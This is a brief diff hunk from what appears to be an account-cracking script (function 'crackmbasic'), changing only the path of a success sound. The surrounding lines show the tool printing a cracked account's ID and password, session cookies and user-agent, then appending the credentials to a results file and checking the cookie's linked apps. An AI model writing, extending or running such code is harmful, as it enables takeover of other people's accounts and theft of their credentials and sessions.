@@ -1826,7 +1826,7 @@ def crackmbasic(idf,pwv):
 				cetak(panel(f"[bold green]{idf} ◊ {pw}",width=35,title=f"[bold red][[bold white] Data [bold red]]",style=f"bold red"))
 				cetak(panel(f"[bold green]{kuki}",width=90,title=f"[bold red][[bold white] Cookies [bold red]]",style=f"bold red"))
 				cetak(panel(f"[bold green]{ua}",width=90,title=f"[bold red][[bold white] User-Agent [bold red]]",style=f"bold red"))
-				os.popen("play-audio dapet.mp3")
+				os.popen("play-audio data/audio/dapet.mp3")
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 				cek_apk(kuki)
 				break
